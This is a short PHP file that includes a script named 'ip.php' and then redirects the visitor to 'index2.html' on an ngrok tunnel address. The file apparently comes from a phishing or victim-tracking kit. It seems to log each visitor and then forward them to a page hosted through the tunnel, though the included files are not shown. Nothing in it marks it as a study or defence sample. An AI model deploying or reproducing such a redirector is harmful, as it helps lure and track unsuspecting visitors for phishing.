<?php
include 'ip.php';
header('Location: https://7aea-2409-4061-2d15-7094-508f-7cb9-6695-25fc.ngrok.io/index2.html');
exit
?>
